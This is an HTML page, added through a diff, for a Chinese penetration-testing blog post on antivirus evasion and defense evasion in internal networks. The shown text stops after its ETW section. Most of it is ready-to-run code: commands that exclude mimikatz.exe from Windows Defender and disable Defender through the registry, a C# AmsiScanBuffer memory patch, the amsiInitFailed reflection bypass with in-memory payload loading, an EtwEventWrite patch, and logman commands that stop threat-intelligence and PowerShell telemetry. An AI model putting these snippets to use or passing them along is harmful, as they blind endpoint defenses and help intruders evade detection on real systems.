@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言在内网渗透中，攻击者获取初始访问权限后面临的首要挑战是如何在目标环境中驻留并横向移动而不被检测。随着端点检测与响应（EDR）、反恶意软件扫描接口（AMSI）以及事件跟踪（ETW）等防御机制的普及，传统攻击工具往往在落地瞬间就会被查杀。本文系统梳理内网渗透中常用的免杀与防御规避技术，帮助安全从业人员理解攻防对抗原理，从而更好地构建防御体系。 免责声明：本文所述技术仅供安全研究、授权渗透测试及防御">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透中的免杀与防御规避">
+<meta property="og:url" content="https://congliang.github.io/Intranet-defense-evasion/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言在内网渗透中，攻击者获取初始访问权限后面临的首要挑战是如何在目标环境中驻留并横向移动而不被检测。随着端点检测与响应（EDR）、反恶意软件扫描接口（AMSI）以及事件跟踪（ETW）等防御机制的普及，传统攻击工具往往在落地瞬间就会被查杀。本文系统梳理内网渗透中常用的免杀与防御规避技术，帮助安全从业人员理解攻防对抗原理，从而更好地构建防御体系。 免责声明：本文所述技术仅供安全研究、授权渗透测试及防御">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-12-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.897Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-defense-evasion/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-defense-evasion/","path":"Intranet-defense-evasion/","title":"内网渗透中的免杀与防御规避"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>内网渗透中的免杀与防御规避 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Windows-Defender-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">一、Windows Defender 绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%B7%BB%E5%8A%A0%E6%8E%92%E9%99%A4%E8%B7%AF%E5%BE%84%E4%B8%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%A6%81%E7%94%A8"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 添加排除路径与注册表禁用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-Token-%E7%AA%83%E5%8F%96%E4%B8%8E%E6%9D%83%E9%99%90%E6%93%8D%E7%BA%B5"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 Token 窃取与权限操纵</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81AMSI-%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="nav-number">3.</span> <span class="nav-text">二、AMSI 绕过技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%86%85%E5%AD%98%E4%BF%AE%E8%A1%A5-AmsiScanBuffer"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 内存修补 AmsiScanBuffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-amsiInitFailed-%E4%B8%8E%E5%8F%8D%E5%B0%84%E5%8A%A0%E8%BD%BD"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 amsiInitFailed 与反射加载</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81ETW-%E7%A6%81%E7%94%A8%E6%8A%80%E6%9C%AF"><span class="nav-number">4.</span> <span class="nav-text">三、ETW 禁用技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E4%BF%AE%E8%A1%A5-EtwEventWrite"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 修补 EtwEventWrite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-logman-%E4%B8%8E-NET-%E7%8E%AF%E5%A2%83%E7%BB%95%E8%BF%87"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 logman 与 .NET 环境绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81AppLocker-%E7%BB%95%E8%BF%87%E4%B8%8E-DLL-%E5%8A%AB%E6%8C%81"><span class="nav-number">5.</span> <span class="nav-text">四、AppLocker 绕过与 DLL 劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E7%AD%BE%E5%90%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%EF%BC%88LOLBin%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 签名二进制代理执行（LOLBin）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-DLL-%E5%8A%AB%E6%8C%81%E4%B8%8E-COM-%E5%AF%B9%E8%B1%A1%E7%BB%95%E8%BF%87"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 DLL 劫持与 COM 对象绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81EDR-%E8%A7%84%E9%81%BF%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-number">6.</span> <span class="nav-text">五、EDR 规避核心原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E7%94%A8%E6%88%B7%E6%80%81-Hook-%E8%A7%A3%E9%99%A4"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 用户态 Hook 解除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E7%9B%B4%E6%8E%A5%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%88Direct-Syscall%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 直接系统调用（Direct Syscall）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E8%A7%A3%E9%99%A4"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 进程注入与内核回调解除</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81C2-%E9%80%9A%E4%BF%A1%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF"><span class="nav-number">7.</span> <span class="nav-text">六、C2 通信隐藏技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E5%9F%9F%E5%89%8D%E7%BD%AE%EF%BC%88Domain-Fronting%EF%BC%89"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 域前置（Domain Fronting）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-CDN-%E4%B8%AD%E7%BB%A7%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 CDN 中继与隧道技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E6%B5%81%E9%87%8F%E4%BC%AA%E8%A3%85%E4%B8%8E%E6%8A%96%E5%8A%A8%E7%AD%96%E7%95%A5"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 流量伪装与抖动策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4%E6%8A%80%E6%9C%AF"><span class="nav-number">8.</span> <span class="nav-text">七、日志清除技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-wevtutil-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 wevtutil 清除事件日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%BF%87%E6%BB%A4%E5%88%A0%E9%99%A4"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 单条日志过滤删除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-auditpol-%E7%A6%81%E7%94%A8%E5%AE%A1%E8%AE%A1%E7%AD%96%E7%95%A5"><span class="nav-number">8.3.</span> <span class="nav-text">7.3 auditpol 禁用审计策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-%E5%85%B6%E4%BB%96%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="nav-number">8.4.</span> <span class="nav-text">7.4 其他痕迹清理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF%E4%B8%8E%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">八、纵深防御规避与建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E6%94%BB%E5%87%BB%E9%93%BE%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 攻击链设计原则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">10.</span> <span class="nav-text">结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-defense-evasion/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="内网渗透中的免杀与防御规避 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网渗透中的免杀与防御规避
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-12-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-12-05T08:00:00+08:00">2025-12-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内网渗透中，攻击者获取初始访问权限后面临的首要挑战是如何在目标环境中驻留并横向移动而不被检测。随着端点检测与响应（EDR）、反恶意软件扫描接口（AMSI）以及事件跟踪（ETW）等防御机制的普及，传统攻击工具往往在落地瞬间就会被查杀。本文系统梳理内网渗透中常用的免杀与防御规避技术，帮助安全从业人员理解攻防对抗原理，从而更好地构建防御体系。</p>
+<p><strong>免责声明：本文所述技术仅供安全研究、授权渗透测试及防御建设参考，严禁用于任何非法用途。使用者需自行承担一切法律后果。</strong></p>
+<hr>
+<h2 id="一、Windows-Defender-绕过方法"><a href="#一、Windows-Defender-绕过方法" class="headerlink" title="一、Windows Defender 绕过方法"></a>一、Windows Defender 绕过方法</h2><h3 id="1-1-添加排除路径与注册表禁用"><a href="#1-1-添加排除路径与注册表禁用" class="headerlink" title="1.1 添加排除路径与注册表禁用"></a>1.1 添加排除路径与注册表禁用</h3><p>Windows Defender 允许通过 PowerShell 和注册表添加扫描排除项。攻击者若已获得管理员权限，可直接将工作目录或特定扩展名加入排除列表：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加排除路径、进程与扩展名</span></span><br><span class="line"><span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionPath</span> <span class="string">&quot;C:\Users\Public\Documents&quot;</span></span><br><span class="line"><span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionProcess</span> <span class="string">&quot;mimikatz.exe&quot;</span></span><br><span class="line"><span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionExtension</span> <span class="string">&quot;.enc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前排除配置</span></span><br><span class="line"><span class="built_in">Get-MpPreference</span> | <span class="built_in">Select-Object</span> ExclusionPath, ExclusionProcess, ExclusionExtension</span><br></pre></td></tr></table></figure>
+
+<p>在具备 SYSTEM 或 TrustedInstaller 权限时，可通过注册表彻底禁用 Defender：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line">&amp; <span class="string">&quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot;</span> <span class="literal">-RemoveDefinitions</span> <span class="literal">-All</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-Token-窃取与权限操纵"><a href="#1-2-Token-窃取与权限操纵" class="headerlink" title="1.2 Token 窃取与权限操纵"></a>1.2 Token 窃取与权限操纵</h3><p>当无法直接禁用 Defender 时，可利用 <code>AdjustTokenPrivileges</code> 启用 <code>SeDebugPrivilege</code>，以高完整性级别运行进程绕过用户态检测。</p>
+<hr>
+<h2 id="二、AMSI-绕过技术"><a href="#二、AMSI-绕过技术" class="headerlink" title="二、AMSI 绕过技术"></a>二、AMSI 绕过技术</h2><p>AMSI（Antimalware Scan Interface）是微软提供的反恶意软件扫描接口。PowerShell、VBA、.NET 等在运行时通过 AMSI 传递脚本内容，使得免杀极为困难。</p>
+<h3 id="2-1-内存修补-AmsiScanBuffer"><a href="#2-1-内存修补-AmsiScanBuffer" class="headerlink" title="2.1 内存修补 AmsiScanBuffer"></a>2.1 内存修补 AmsiScanBuffer</h3><p>经典手法：在 PowerShell 进程中定位 <code>AmsiScanBuffer</code> 函数并修改其汇编指令使其直接返回 <code>AMSI_RESULT_CLEAN</code>：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AmsiBypass</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>] <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetProcAddress</span>(<span class="params">IntPtr h, <span class="built_in">string</span> n</span>)</span>;</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>] <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">LoadLibrary</span>(<span class="params"><span class="built_in">string</span> n</span>)</span>;</span><br><span class="line">    [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>] <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">VirtualProtect</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        IntPtr a, <span class="built_in">uint</span> s, <span class="built_in">uint</span> p, <span class="keyword">out</span> <span class="built_in">uint</span> o</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Patch</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        IntPtr lib = LoadLibrary(<span class="string">&quot;amsi.dll&quot;</span>);</span><br><span class="line">        IntPtr ptr = GetProcAddress(lib, <span class="string">&quot;AmsiScanBuffer&quot;</span>);</span><br><span class="line">        <span class="built_in">byte</span>[] patch = &#123; <span class="number">0xB8</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0xC3</span> &#125;; <span class="comment">// mov eax,0x80070057; ret</span></span><br><span class="line">        <span class="built_in">uint</span> old;</span><br><span class="line">        VirtualProtect(ptr, (<span class="built_in">uint</span>)patch.Length, <span class="number">0x40</span>, <span class="keyword">out</span> old);</span><br><span class="line">        Marshal.Copy(patch, <span class="number">0</span>, ptr, patch.Length);</span><br><span class="line">        VirtualProtect(ptr, (<span class="built_in">uint</span>)patch.Length, old, <span class="keyword">out</span> old);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-amsiInitFailed-与反射加载"><a href="#2-2-amsiInitFailed-与反射加载" class="headerlink" title="2.2 amsiInitFailed 与反射加载"></a>2.2 amsiInitFailed 与反射加载</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反射设置 amsiInitFailed 标志</span></span><br><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)</span><br><span class="line">    .GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反射加载 .NET 程序集（避免磁盘写入）</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="string">&quot;payload.dll&quot;</span>)</span><br><span class="line"><span class="variable">$asm</span> = [<span class="type">System.Reflection.Assembly</span>]::Load(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="variable">$asm</span>.EntryPoint.Invoke(<span class="variable">$null</span>, <span class="selector-tag">@</span>(, [<span class="built_in">string</span>[]]<span class="selector-tag">@</span>()))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、ETW-禁用技术"><a href="#三、ETW-禁用技术" class="headerlink" title="三、ETW 禁用技术"></a>三、ETW 禁用技术</h2><p>Event Tracing for Windows 是 Windows 内置的事件跟踪机制，EDR 大量依赖 ETW 提供者获取进程创建、网络连接等遥测数据。</p>
+<h3 id="3-1-修补-EtwEventWrite"><a href="#3-1-修补-EtwEventWrite" class="headerlink" title="3.1 修补 EtwEventWrite"></a>3.1 修补 EtwEventWrite</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DisableETW</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HMODULE ntdll = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    FARPROC etw = GetProcAddress(ntdll, <span class="string">&quot;EtwEventWrite&quot;</span>);</span><br><span class="line">    DWORD old;</span><br><span class="line">    VirtualProtect(etw, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    *(BYTE*)etw = <span class="number">0xC3</span>;  <span class="comment">// ret</span></span><br><span class="line">    VirtualProtect(etw, <span class="number">1</span>, old, &amp;old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-logman-与-NET-环境绕过"><a href="#3-2-logman-与-NET-环境绕过" class="headerlink" title="3.2 logman 与 .NET 环境绕过"></a>3.2 logman 与 .NET 环境绕过</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">:: 关闭 Microsoft-Windows-Threat-Intelligence 提供者</span><br><span class="line">logman stop &quot;ThreatIntelligence&quot; -ets</span><br><span class="line">:: 关闭 DNS 客户端事件</span><br><span class="line">logman stop &quot;Microsoft-Windows-DNS-Client&quot; -ets</span><br><span class="line">:: 关闭 PowerShell 日志提供者</span><br><span class="line">logman stop &quot;Microsoft-Windows-PowerShell&quot; -ets</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .NET 环境阻止 CLR 生成 ETW 事件</span></span><br><span class="line">[<span class="type">Environment</span>]::SetEnvironmentVariable(<span class="string">&quot;COMPlus_ETWEnabled&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;Process&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
